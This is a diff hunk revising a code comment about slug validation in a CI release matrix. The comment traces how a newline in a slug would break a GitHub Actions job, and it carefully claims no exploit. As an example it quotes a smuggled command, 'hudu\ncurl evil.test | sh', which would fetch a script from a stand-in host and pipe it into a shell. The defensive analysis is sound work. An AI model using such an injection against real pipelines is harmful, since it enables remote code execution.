@@ -110,18 +110,22 @@ def asset_map(cli_binary: str, mcp_binary: str) -> dict[str, dict[str, str]]:
 # exactly one class of value: a slug ending in ONE newline. An EMBEDDED newline
 # ("hudu\ncurl evil.test | sh") is rejected by both - `[a-z0-9-]*` cannot match
 # a newline - so no attacker-chosen command can be smuggled through either
-# anchor. What "hudu\n" does reach is `cd ${{ matrix.skill.dir }}`, where
-# release_matrix.py's `skills/{slug}/cli` becomes two shell lines:
+# anchor. What "hudu\n" would produce, measured link by link locally:
+# release_matrix.py builds `dir` as f"skills/{slug}/cli", giving
+# 'skills/hudu\n/cli'; json.dumps escapes it, so the matrix still writes as one
+# physical line to GITHUB_OUTPUT and fromJSON restores the real newline; a shell
+# handed that value in `cd ${{ matrix.skill.dir }}` sees two lines
 #
 #     cd skills/hudu
 #     /cli
 #
-# i.e. `/cli: No such file or directory`, exit 1, under the `bash -e` GitHub
-# Actions uses for `run:`. That is a broken job, not command execution. So this
-# is defence in depth and a correctness fix - the grammar means "the whole value
-# is in the alphabet", and `$` quietly admits a value whose last character the
-# alphabet excludes - NOT a demonstrated injection. No exploit is claimed here
-# because none was demonstrated.
+# and reports `/cli: No such file or directory`, exit 1, under `set -e`. That is
+# a broken job, not command execution. So this is defence in depth and a
+# correctness fix - the grammar means "the whole value is in the alphabet", and
+# `$` quietly admits a value whose last character the alphabet excludes - NOT a
+# demonstrated injection. No exploit is claimed here because none was
+# demonstrated, and the final link (GitHub Actions expanding the interpolation)
+# was reasoned from its documented behaviour, not run.
 #
 # The exposure this whole grammar closes is the larger one: before it, NOTHING
 # validated these identifiers, and CI runs on `pull_request`, so a fork PR's own
